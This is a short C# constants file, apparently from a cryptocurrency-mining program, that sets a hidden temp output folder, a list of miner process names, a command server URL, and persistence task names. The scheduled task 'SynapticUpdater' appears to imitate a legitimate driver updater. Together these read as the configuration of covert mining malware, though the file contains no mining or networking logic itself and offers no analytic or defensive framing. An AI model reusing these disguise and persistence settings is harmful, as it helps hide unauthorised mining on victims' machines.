using System;
using System.IO;
using System.Reflection;

namespace CryptoSrv.Shared.Managers;

public class AppManager
{
	public class Worker
	{
		public static readonly string OutDir = Path.Combine(Path.GetTempPath(), "VSStore");

		public static readonly string[] UsedProcessNames = new string[5] { "hstart", "minerd", "cgminer", "testminer", "crwrker" };
	}

	public class Server
	{
		public static readonly string Url = "http://cryp.in";
	}

	public class ScheduleTask
	{
		public static readonly string TaskName = "SynapticUpdater";
	}

	public class StartupTask
	{
		public static readonly string TaskName = "Crypto processor";
	}

	public const string AppVersion = "1.4.0.0";

	public static readonly string Bits = ((IntPtr.Size == 8) ? "64" : "32");

	public static readonly Assembly Asm = Assembly.GetEntryAssembly();
}
